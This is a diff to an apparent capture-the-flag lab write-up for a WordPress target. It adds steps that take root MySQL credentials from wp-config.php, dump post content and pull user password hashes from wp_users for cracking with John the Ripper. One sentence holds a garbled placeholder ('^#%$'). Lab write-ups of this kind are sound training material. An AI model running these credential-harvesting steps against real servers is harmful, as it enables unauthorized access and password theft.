@@ -68,11 +68,17 @@ cd /var/www/html/wordpress
 nano wp-config.php  
 ~~~
 
-
+![red5](https://user-images.githubusercontent.com/32025331/155894960-bc91d0f1-f6ac-4d95-bc81-c3027734bba8.PNG)  
+Within wp-config.php we were able to find credentials to a MySQL database.
 ~~~
-mysql -u root -pR@v3nSecurity  
+mysql -u root -pR@v3nSecurity
+show databases;
+use wordpress;
+show tables;
+select post_content from wp_posts;
 ~~~
-
+![red9](https://user-images.githubusercontent.com/32025331/155896987-d9932ea6-75bb-4b88-ae79-67f5b9a46999.PNG)  
+  
 **Flag 4 from Steven’s account:  **  
 - Tools used: SSH, MySQL, johntheripper  
 - Using the MySQL credentials from before:  
@@ -82,8 +88,7 @@ show databases;
 use wordpress;
 show tables;
 select user_login, user_pass from wp_users;
-~~~
-![red5](https://user-images.githubusercontent.com/32025331/155894960-bc91d0f1-f6ac-4d95-bc81-c3027734bba8.PNG)  
+~~~  
 We found the hashed passwords within ^#%$.  
 Exit back out to Kali. From here we can use John the Ripper:  
 ![red6](https://user-images.githubusercontent.com/32025331/155894961-05ed83c8-ab77-40f0-b8e0-33995815607d.PNG)  
